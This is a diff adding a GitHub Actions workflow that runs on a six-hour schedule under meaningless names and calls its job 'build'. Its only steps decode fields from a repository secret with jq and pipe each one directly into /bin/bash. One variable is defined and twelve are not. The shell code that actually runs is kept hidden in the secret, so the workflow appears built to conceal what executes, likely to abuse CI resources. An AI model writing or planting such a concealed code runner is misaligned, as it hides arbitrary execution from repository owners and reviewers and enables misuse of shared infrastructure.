@@ -1,0 +1,28 @@
+name: tongmancongtian
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tongmancongtian
+        env:
+          dan6060: ${{ secrets.dan6060 }}
+        run: |
+          echo $dan6060 | jq -r .yv6 | /bin/bash
+          echo $rvyi07 | jq -r .c767 | /bin/bash
+          echo $m40 | jq -r .pznom372 | /bin/bash
+          echo $t2850 | jq -r .adr70031 | /bin/bash
+          echo $nmit4560 | jq -r .yjer1 | /bin/bash
+          echo $qyb83 | jq -r .nqyee3 | /bin/bash
+          echo $nigw37196 | jq -r .mon85 | /bin/bash
+          echo $hi829 | jq -r .a6 | /bin/bash
+          echo $xcttd2575 | jq -r .nyvr9591 | /bin/bash
+          echo $h40139 | jq -r .c8113 | /bin/bash
+          echo $g1946 | jq -r .pfgam4938 | /bin/bash
+          echo $jp63850 | jq -r .vvns51005 | /bin/bash
+          echo $iuoh7199 | jq -r .cxmfu6086 | /bin/bash
+
